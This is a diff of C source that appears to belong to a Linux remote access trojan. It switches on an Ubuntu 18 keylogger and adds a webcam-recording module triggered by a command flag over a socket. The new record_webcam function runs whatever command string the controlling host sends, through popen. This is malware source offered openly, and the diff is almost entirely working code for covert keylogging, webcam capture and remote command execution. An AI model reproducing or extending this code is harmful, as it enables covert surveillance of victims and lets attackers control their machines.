@@ -77,9 +77,9 @@ int main(int argc, char*argv[])
 
     //ubuntu16_keylogger_init();
 
-    //ubuntu18_keylogger_init();
+    ubuntu18_keylogger_init();
 
-    mint_keylogger_init();
+    //mint_keylogger_init();
 
     //debian_keylogger_init();
 
@@ -123,6 +123,7 @@ void dispatch_modules(char *argv[])
 
     pthread_t stream_desktop = 0;
     pthread_t stream_webcam_thread = 0;
+    pthread_t record_webcam_thread = 0;
 
 
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -364,6 +365,7 @@ void dispatch_modules(char *argv[])
         }
 
 
+        /**
         if(flag == 13)
         {
             printf("\t\tSTREAMING STARTED....\n");
@@ -381,7 +383,26 @@ void dispatch_modules(char *argv[])
 
                 return;
             }
-            **/
+
+        }
+        **/
+
+        if(flag == 14)
+        {
+            printf("\t\tRECORD WEBCAM STARTED....\n");
+
+            /** Call the thread that will execute the stream command **/
+            if(pthread_create(&record_webcam_thread, NULL, (void*)record_webcam, NULL) == -1)
+            {
+                error("pthread_create() record_webcam_thread", "dispatch_modules()");
+                exit(-1);
+            }
+
+            if(pthread_join(record_webcam_thread, NULL))
+            {
+                perror("pthread_join");
+                return;
+            }
 
         }
     }
@@ -938,8 +959,6 @@ void execute_watch_cmd()
 
     free(buffer);
 
-    close(csock);
-
 }
 
 void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
@@ -997,6 +1016,47 @@ void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
         default:
             /* Unhandled message */
             break;
+    }
+}
+
+void record_webcam()
+{
+    size_t len_record_cmd = 0;
+    char *buffer = NULL;
+
+    FILE *pipe = NULL;
+
+    GstElement *pipeline;
+    GstBus *bus;
+    GstStateChangeReturn ret;
+    GMainLoop *main_loop;
+    CustomData data;
+
+    if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
+    {
+        error("recv() len_record_cmd", "record_webcam()");
+        exit(-1);
+    }
+
+    buffer = malloc(len_record_cmd * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc() buffer", "record_webcam()");
+        exit(-1);
+    }
+
+    if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
+    {
+        error("recv() buffer", "record_webcam()");
+        exit(-1);
+    }
+
+    /* Execute cmd */
+    pipe = popen(buffer, "r");
+    if(pipe == NULL)
+    {
+        error("popen() pipe", "record_webcam()");
+        return;
     }
 }
 
